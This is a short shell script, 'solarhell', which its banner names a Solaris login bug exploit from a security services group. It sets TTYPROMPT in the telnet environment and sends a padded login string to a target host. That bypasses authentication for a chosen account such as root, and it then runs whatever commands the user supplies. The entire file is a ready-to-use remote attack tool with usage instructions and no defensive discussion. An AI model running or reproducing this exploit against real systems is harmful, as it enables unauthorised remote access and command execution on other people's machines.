#!/bin/sh

DATA1="environ define TTYPROMPT abcdef"
DATA2="o $1"
DATA3="$2 c c c c c c c c c c c c c c c c c c c c c c c c c c c c c c c c c c c c c c c c c c c c c c c c c c c c c c c c c c c c c c c c\n"
SLEEP=5

echo ""
echo "Deloitte & Touche SSG (Security Services Group),  solaris login bug exploit"
echo "		coded by mvanaswegen@deloitte.co.za and rdawes@deloitte.co.za"
echo ""
echo ""

if [ -z "$1" ]; then 
	echo "- solarhell <host> <account> <commands>"
	echo ""
	echo "i.e. ./solarhell tank root ps -ef" 	
	exit
fi

echo "- connecting to $1 as $2"

shift
shift
DATA4="$*"

echo "- exec $DATA4"
echo ""
echo ""

(
echo $DATA1
echo $DATA2
sleep $SLEEP
echo $DATA3
echo "id ; uname -a"
sleep $SLEEP
echo $DATA4
sleep $SLEEP
) | telnet -n - 

echo "- all done"

